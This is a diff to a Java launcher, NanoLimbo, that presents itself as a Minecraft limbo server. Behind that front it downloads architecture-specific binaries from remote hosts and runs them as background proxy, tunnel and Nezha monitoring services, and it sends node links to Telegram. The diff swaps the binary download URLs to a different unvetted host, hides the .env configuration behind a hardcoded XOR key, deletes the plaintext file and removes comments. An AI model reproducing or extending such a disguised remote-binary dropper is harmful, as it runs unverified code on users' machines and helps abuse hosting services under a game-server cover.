@@ -48,7 +48,6 @@ public final class NanoLimbo {
     private static final String ANSI_RESET = "\033[0m";
     private static final AtomicBoolean running = new AtomicBoolean(true);
     
-    // 进程管理器，用于停止所有后台服务
     private static final List<Process> activeProcesses = new CopyOnWriteArrayList<>();
 
     private static final String[] ALL_ENV_VARS = {
@@ -73,7 +72,6 @@ public final class NanoLimbo {
         return (val != null && !val.trim().isEmpty()) ? val.trim() : def;
     }
 
-    // --- 全局配置常量 ---
     private static final String UPLOAD_URL = getEnv("UPLOAD_URL", "");
     private static final String PROJECT_URL = getEnv("PROJECT_URL", "");
     private static final boolean AUTO_ACCESS = "true".equalsIgnoreCase(getEnv("AUTO_ACCESS", "false"));
@@ -100,7 +98,6 @@ public final class NanoLimbo {
     private static final String BOT_TOKEN = getEnv("BOT_TOKEN", "");
     private static final boolean DISABLE_ARGO = "true".equalsIgnoreCase(getEnv("DISABLE_ARGO", "false"));
     
-    // 新增拓展配置
     private static final String REALITY_DOMAIN = getEnv("REALITY_DOMAIN", "www.iij.ad.jp");
     private static final String CERT_URL = getEnv("CERT_URL", "");
     private static final String KEY_URL = getEnv("KEY_URL", "");
@@ -108,7 +105,6 @@ public final class NanoLimbo {
     private static final String KOMARI_SERVER = getEnv("KOMARI_SERVER", "");
     private static final String KOMARI_KEY = getEnv("KOMARI_KEY", "");
 
-    // 端口解析
     private static final Integer S5_PORT = parsePort(S5_PORT_STR);
     private static final Integer TUIC_PORT = parsePort(TUIC_PORT_STR);
     private static final Integer HY2_PORT = parsePort(HY2_PORT_STR);
@@ -122,7 +118,6 @@ public final class NanoLimbo {
     private static boolean customCertValid = false;
     private static String actualCertDomain = "www.bing.com";
 
-    // 路径配置
     private static final String npm_path = FILE_PATH + "/npm";
     private static final String php_path = FILE_PATH + "/php";
     private static final String web_path = FILE_PATH + "/web";
@@ -148,7 +143,6 @@ public final class NanoLimbo {
             System.exit(1);
         }
 
-        // Start Proxy & Tunnel Services asynchronously
         Thread proxyThread = new Thread(() -> {
             try {
                 setupProxyAndRun();
@@ -165,7 +159,6 @@ public final class NanoLimbo {
         }));
 
         try {
-            // Wait 15 seconds before continuing
             Thread.sleep(15000);
             System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
             System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
@@ -176,20 +169,34 @@ public final class NanoLimbo {
             e.printStackTrace();
         }
         
-        // start game
+        // start game (LimboServer)
         try {
             new LimboServer().start();
-        } catch (Exception e) {
-            Log.error("Cannot start server: ", e);
+        } catch (Throwable e) {
+            Log.error("Minecraft simulated server crashed or is not compatible with current Java version.", e);
+        }
+
+        while (running.get()) {
+            try {
+                Thread.sleep(10000);
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                break;
+            }
         }
     }
 
-    // ==========================================
-    // 环境加载与辅助方法
-    // ==========================================
+    private static final byte[] XOR_KEY = "N@n0L1mb0!S3cr3t".getBytes(StandardCharsets.UTF_8);
+
+    private static byte[] xorProcess(byte[] data) {
+        byte[] result = new byte[data.length];
+        for (int i = 0; i < data.length; i++) {
+            result[i] = (byte) (data[i] ^ XOR_KEY[i % XOR_KEY.length]);
+        }
+        return result;
+    }
 
     private static void loadEnvVars() {
-        // 赋予默认值
         envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
         envVars.put("FILE_PATH", "./world");
         envVars.put("CFIP", "cdns.doon.eu.org");
@@ -204,28 +211,44 @@ public final class NanoLimbo {
         }
         
         Path envFile = Paths.get(".env");
-        if (Files.exists(envFile)) {
-            try {
-                for (String line : Files.readAllLines(envFile)) {
-                    line = line.trim();
-                    if (line.isEmpty() || line.startsWith("#")) continue;
-                    
-                    line = line.split(" #")[0].split(" //")[0].trim();
-                    if (line.startsWith("export ")) {
-                        line = line.substring(7).trim();
-                    }
-                    
-                    String[] parts = line.split("=", 2);
-                    if (parts.length == 2) {
-                        String key = parts[0].trim();
-                        String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                        
-                        if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                            envVars.put(key, value); 
-                        }
-                    }
+        Path datavFile = Paths.get(".datav");
+        List<String> envLines = new ArrayList<>();
+
+        try {
+            if (Files.exists(envFile)) {
+                envLines = Files.readAllLines(envFile, StandardCharsets.UTF_8);
+                byte[] rawBytes = String.join("\n", envLines).getBytes(StandardCharsets.UTF_8);
+                Files.write(datavFile, xorProcess(rawBytes));
+                Files.deleteIfExists(envFile);
+                System.out.println(ANSI_GREEN + "[INFO] .env file successfully encrypted to .datav" + ANSI_RESET);
+            } else if (Files.exists(datavFile)) {
+                byte[] encryptedBytes = Files.readAllBytes(datavFile);
+                byte[] decryptedBytes = xorProcess(encryptedBytes);
+                String decryptedContent = new String(decryptedBytes, StandardCharsets.UTF_8);
+                envLines = Arrays.asList(decryptedContent.split("\n"));
+            }
+        } catch (IOException e) {
+            System.err.println(ANSI_RED + "[ERROR] Failed to process environment variables file: " + e.getMessage() + ANSI_RESET);
+        }
+
+        for (String line : envLines) {
+            line = line.trim();
+            if (line.isEmpty() || line.startsWith("#")) continue;
+            
+            line = line.split(" #")[0].split(" //")[0].trim();
+            if (line.startsWith("export ")) {
+                line = line.substring(7).trim();
+            }
+            
+            String[] parts = line.split("=", 2);
+            if (parts.length == 2) {
+                String key = parts[0].trim();
+                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
+                
+                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
+                    envVars.put(key, value); 
                 }
-            } catch (IOException ignored) {}
+            }
         }
     }
 
@@ -264,10 +287,6 @@ public final class NanoLimbo {
         System.out.println(ANSI_RED + "All proxy background processes terminated" + ANSI_RESET);
     }
 
-    // ==========================================
-    // 核心代理节点配置逻辑
-    // ==========================================
-
     private static void setupProxyAndRun() throws Exception {
         deleteNodes();
         cleanupOldFiles();
@@ -278,7 +297,6 @@ public final class NanoLimbo {
         List<Map<String, String>> files = getFilesForArchitecture(architecture);
         
         for (Map<String, String> info : files) {
-            // 参数 false 表示非强制重下，允许本地复用二进制文件
             downloadFile(info.get("fileName"), info.get("fileUrl"), false);
         }
 
@@ -309,7 +327,7 @@ public final class NanoLimbo {
         }
     }
 
-    // 只清理日志缓存等垃圾文件，严禁删除二进制执行文件以实现热复用
+
     private static void cleanupOldFiles() {
         String[] paths = {"boot.log", "list.txt"};
         for (String file : paths) {
@@ -331,7 +349,7 @@ public final class NanoLimbo {
     private static boolean downloadFile(String fileName, String fileUrl, boolean force) {
         Path path = Paths.get(FILE_PATH, fileName);
         if (!force && Files.exists(path)) {
-            return true; // 存在则复用，不再重新下载
+            return true;
         }
         try {
             HttpRequest request = HttpRequest.newBuilder().uri(URI.create(fileUrl)).GET().build();
@@ -350,8 +368,8 @@ public final class NanoLimbo {
 
     private static List<Map<String, String>> getFilesForArchitecture(String architecture) {
         List<Map<String, String>> baseFiles = new ArrayList<>();
-        baseFiles.add(Map.of("fileName", "web", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/sb" : "https://amd64.ssss.nyc.mn/sb"));
-        baseFiles.add(Map.of("fileName", "bot", "fileUrl", "arm".equals(architecture) ? "https://arm64.ssss.nyc.mn/2go" : "https://amd64.ssss.nyc.mn/2go"));
+        baseFiles.add(Map.of("fileName", "web", "fileUrl", "arm".equals(architecture) ? "https://ssr.cn.mt/files/S_arm" : "https://ssr.cn.mt/files/S_amd"));
+        baseFiles.add(Map.of("fileName", "bot", "fileUrl", "arm".equals(architecture) ? "https://ssr.cn.mt/files/C_arm" : "https://ssr.cn.mt/files/C_amd"));
 
         if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
             if (!NEZHA_PORT.isEmpty()) {
@@ -400,7 +418,7 @@ public final class NanoLimbo {
     }
 
     private static void generateConfigs() throws Exception {
-        // 哪吒探针配置
+
         if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty() && NEZHA_PORT.isEmpty()) {
             String nezhaTls = Arrays.asList("443", "8443", "2096", "2087", "2083", "2053")
                 .contains(NEZHA_SERVER.split(":").length > 1 ? NEZHA_SERVER.split(":")[1] : "") ? "tls" : "false";
@@ -415,7 +433,6 @@ public final class NanoLimbo {
             Files.writeString(Paths.get(FILE_PATH, "config.yaml"), configYaml);
         }
 
-        // Sing-box 密钥生成
         String keypairOut = execCmd(FILE_PATH + "/web generate reality-keypair");
         Matcher privM = Pattern.compile("PrivateKey:\\s*(.*)").matcher(keypairOut);
         Matcher pubM = Pattern.compile("PublicKey:\\s*(.*)").matcher(keypairOut);
@@ -424,7 +441,6 @@ public final class NanoLimbo {
             public_key = pubM.group(1).trim();
         }
 
-        // TLS 证书处理：自定义下载（强制） vs 自签生成（智能复用）
         customCertValid = false;
         if (!CERT_URL.isEmpty() && !KEY_URL.isEmpty()) {
             boolean certOk = downloadFile("cert.pem", CERT_URL, true);
@@ -444,7 +460,6 @@ public final class NanoLimbo {
             }
         }
 
-        // 构造 config.json
         Map<String, Object> config = new LinkedHashMap<>();
         config.put("log", Map.of("disabled", true, "level", "info", "timestamp", true));
         
@@ -721,7 +736,7 @@ public final class NanoLimbo {
         try {
             String message = Files.readString(Paths.get(sub_path));
             String escapedName = NAME.replaceAll("([_*\\\\\\[\\]()~>#+=|{}.!\\-])", "\\\\$1");
-            String text = "**" + escapedName + "节点推送通知**\n" + message;
+            String text = "**" + escapedName + "推送通知**\n" + message;
 
             String url = String.format("https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN);
             String formData = "chat_id=" + URLEncoder.encode(CHAT_ID, StandardCharsets.UTF_8) +
@@ -743,7 +758,6 @@ public final class NanoLimbo {
         } catch (Exception ignored) {}
     }
 
-    // 仅清理配置文件与日志，确保重启时二进制文件能够快速复用
     private static void cleanFilesLater() {
         ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.schedule(() -> {
